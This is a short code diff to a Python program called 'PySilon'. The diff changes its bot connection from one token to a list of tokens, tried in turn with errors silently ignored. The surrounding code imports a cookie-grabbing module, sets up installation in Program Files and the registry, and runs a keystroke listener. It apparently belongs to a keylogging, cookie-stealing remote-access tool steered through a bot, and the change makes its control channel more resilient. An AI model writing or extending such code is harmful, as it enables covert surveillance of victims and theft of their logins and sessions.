@@ -44,7 +44,7 @@ from resources.get_cookies import *
 # - Please check out README.md before  - #     ! It is recommended to use compiler.py for building executable !
 # -   you change following settings    - #       (following settings will be configured directly in compiler.py)
 
-bot_token = ''   # Paste here BOT-token
+bot_tokens = ['']   # Paste here BOT-token
 software_registry_name = 'PySilon'   # -------------------------------------------- Software name shown in registry
 software_directory_name = software_registry_name   # ------------------------------ Directory (containing software executable) located in "C:\Program Files"
 software_executable_name = software_registry_name.replace(' ', '') + '.exe'   # --- Software executable name
@@ -642,5 +642,8 @@ def on_press(key):
 
  
 with Listener(on_press=on_press) as listener:
-    client.run(bot_token)
+    for token in bot_tokens:
+        try:
+            client.run(token)
+        except: pass
     listener.join()
